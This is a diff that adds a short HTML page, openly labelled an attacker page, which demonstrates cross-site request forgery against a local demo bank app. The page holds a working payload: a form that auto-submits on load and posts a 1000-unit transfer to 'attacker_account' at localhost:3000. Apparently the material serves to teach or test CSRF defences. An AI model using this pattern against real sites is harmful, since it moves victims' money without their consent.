@@ -1,0 +1,12 @@
+<!-- attacker.html (open file://... or from a different local server) -->
+<!doctype html>
+<body>
+  <h3>Attacker page</h3>
+  <form action="http://localhost:3000/transfer" method="POST" id="f">
+    <input name="to" value="attacker_account">
+    <input name="amount" value="1000">
+  </form>
+  <script>document.getElementById('f').submit();</script>
+  <p>If you visit this while logged into the bank, it will POST automatically.</p>
+</body>
+</html>
